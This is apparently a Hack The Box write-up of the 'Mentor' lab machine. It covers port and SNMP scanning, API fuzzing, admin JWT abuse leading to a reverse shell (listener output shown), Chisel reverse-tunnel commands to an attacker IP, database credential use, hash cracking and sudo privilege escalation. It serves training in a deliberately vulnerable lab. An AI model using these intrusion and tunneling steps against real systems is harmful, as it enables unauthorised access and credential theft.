## Scanning

We start with nmap port sca and givving as 2 open ports; 22 nd 80 and `udp` ports
```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU --min-rate 10000 10.10.11.193 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-22 00:02 EST
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.086s latency).
Not shown: 993 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
161/udp   open   snmp
1214/udp  closed fasttrack
1993/udp  closed snmp-tcp-port
16862/udp closed unknown
20288/udp closed unknown
21948/udp closed unknown
49968/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
```
Changing the host nmae to `mentorquotes.htb`, giving as a webpage with some motivation quotes.
![](/Hack-The-Box/Mentor/img/1.png)


We used `feroxbuster` for hidden directory scan andgot nothing intresting, so we gone for sub-domain enumeration usung `wfuzz` and found a domain named `api`
```shell
┌──(kali㉿kali)-[~/workspace/HTB/machine/mentor]
└─$ wfuzz -u http://mentorquotes.htb/  -H "Host: FUZZ.mentorquotes.htb" -w /home/kali/workspace/tools/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --hc 302
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 26584

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
=====================================================================

000000077:   404        0 L      2 W        22 Ch       "api"          
```
 the page shows nothing intresting 
 ![](/Hack-The-Box/Mentor/img/2.png)

so we did content discovery using `wfuzz` and found something intresting
```shell
┌──(kali㉿kali)-[~/workspace/HTB/machine/mentor]
└─$ wfuzz -u http://api.mentorquotes.htb/FUZZ  -w /home/kali/workspace/tools/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://api.mentorquotes.htb/FUZZ
Total requests: 26584

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
=====================================================================

000000003:   307        0 L      0 W        0 Ch        "admin"                                                                                                                                           
000000076:   200        30 L     62 W       969 Ch      "docs"                                                                                                                                            
000000129:   307        0 L      0 W        0 Ch        "users"                                                                                                                                           
000001011:   307        0 L      0 W        0 Ch        "quotes"                                                                                                                                          
000003781:   403        9 L      28 W       285 Ch      "server-status"            
```

 ![](/Hack-The-BoxMentor/img/3.png)

since `snmp`  port is open we are brute forcing community string using `nmap`
we found two stirings named `public and internal` so using `snmpwalk ` we do some basic enumerations and found a intresting password from `internal` 
` STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"`

Let’s try to sign up for a new account using the email address `james@mentorquotes.htb`

 ![](/Hack-The-Box/Mentor/img/5.png)

The sign-up process did not work using the email address that we found. Let’s try using a different email address instead.

![](/Hack-The-Box/Mentor/img/6.png)
 
Now that we have created a new account, let’s try using the login function to access it

![](/Hack-The-Box/Mentor/img/7.png)

Upon successful login, the login function provided us with a JWT (JSON Web Token), which we can use to authenticate future requests to the website.
We are using this JWT to access `GET /users` along with  `Authorization` header

![](/Hack-The-Box/Mentor/img/8.png)

We received a response stating that only an administrator can access this resource.So from `snmpwalk` we found a password using that password we tried to login and get a valid JWT.

![](/Hack-The-Box/Mentor/img/9.png)

let’s try the function using the new JWT to see if we have the necessary permissions.

![](/Hack-The-Box/Mentor/img/10.png)
we were able to successfully run the ‘get users’ function and retrieve the list of users.

let’s check the contents of the ‘admin’ directory.
![](/Hack-The-Box/Mentor/img/11.png)

`/check` was not implemented yet and changing the method of `/backup` gives a response
![](/Hack-The-Box/Mentor/img/12.png)

since api is more verbose we add some wrong parametrs to find the orginal response 

![](/Hack-The-Box/Mentor/img/13.png)

now we try to create our revershell payload.
![](/Hack-The-Box/Mentor/img/14.png)

we get shell as root 
```shell
┌──(kali㉿kali)-[~/workspace/HTB/machine/mentor]
└─$ nc -nvlp 7878                  
listening on [any] 7878 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.11.193] 45147
/bin/sh: can't access tty; job control turned off
/app # whoami
root
/app # 
```
now we realize that we are indside a docker container.
After reviewing the local files, we found a file called ‘db.py’ located in the ‘/app/app’ directory. This file contains information about the PostgreSQL database.

```python
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)


# Databases query builder
database = Database(DATABASE_URL)

```
In order to access the database we need to tunnel to our machine and use the credentials.

## Tunneling

Use  Chisel to create a tunnel to our machine and use the credentials that we found in the ‘db.py’ file.

`our machine: ./chisel_1.7.7_linux_amd64  server --port 9595 --reverse`

`docker shell: ./chisel_1.7.7_linux_amd64 client -v 10.10.14.12:9595 R:5432:172.22.0.1:5432`

Now we are able to acesss the database
`psql -h 127.0.0.1 -p 5432 -d mentorquotes_db -U postgres`

![](/Hack-The-Box/Mentor/img/15.png)

we were able to carck service_acc hash password `123meunomeeivani`

while running `linepeas` we found `snmpd.conf` file.These file usually contains sensitive credentials or information

![](/Hack-The-Box/Mentor/img/16.png)

there is our password

![](/Hack-The-Box/Mentor/img/17.png)

Now we are able to login as user `james`. User james have the privilege to run `/bin/sh` as sudo user,which help us to gain root privilegs.


![](/Hack-The-Box/Mentor/img/18.png)



![](/Hack-The-Box/Mentor/img/19.png)
